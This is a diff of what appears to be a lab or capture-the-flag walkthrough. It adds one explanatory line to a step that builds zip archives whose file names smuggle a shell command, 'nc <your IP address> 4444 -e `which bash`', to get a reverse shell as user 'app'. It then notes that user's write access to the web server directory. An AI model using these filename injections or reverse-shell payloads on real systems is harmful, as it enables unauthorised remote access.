@@ -58,6 +58,7 @@ printf "@ joergen.jpg\n@=\';nc <your IP address> 4444 -e \`which bash\`;#'.jpg\n
 ```
 
 **option 2**
+Create the tailored filename directly:
 ```
 touch \'\;nc\ <your IP address>\ 4444\ -e\ \`which\ bash\`\;\'.jpg
 zip joergen.zip \'\;nc\ <your IP address>\ 4444\ -e\ \`which\ bash\`\;\'.jpg
@@ -76,11 +77,11 @@ Now you have in the reverse shell listener an interactive shell as user `app`.
 The user `app` has write access to `/tmp` and `/home/app`.
 In addition the user has write access to `/usr/local/bundle`, where the web server is located.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTExNjQ1MjMwMjUsMTQ0MDA5NzA4MywtOT
-M1ODEzMjg4LC02MTM0NDk2NTYsLTEwNTIxNjM2MTcsLTE3NjM1
-NDEzNTUsMTYwNzM0ODUxNCwtODIzMDUwODYxLDEyOTM3MjA0Mz
-ksMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNjE5Mjk3NDExLC01
-NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQzNSwtMzk4NDkxND
-YxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3ODcsLTE0
-Njc2MTUyNjJdfQ==
+eyJoaXN0b3J5IjpbNzkyMzQxMzgzLDE0NDAwOTcwODMsLTkzNT
+gxMzI4OCwtNjEzNDQ5NjU2LC0xMDUyMTYzNjE3LC0xNzYzNTQx
+MzU1LDE2MDczNDg1MTQsLTgyMzA1MDg2MSwxMjkzNzIwNDM5LD
+EzOTU3OTQ4MjQsLTE1OTkyNTQ0MTUsLTYxOTI5NzQxMSwtNTc2
+NjEwMDc1LDIxMDc1Mjk4NDYsOTIyMTQ0MzUsLTM5ODQ5MTQ2MS
+wxMTUxNTU2ODk2LDIzODQ2MDI3MiwxOTMzMzYxNzg3LC0xNDY3
+NjE1MjYyXX0=
 -->
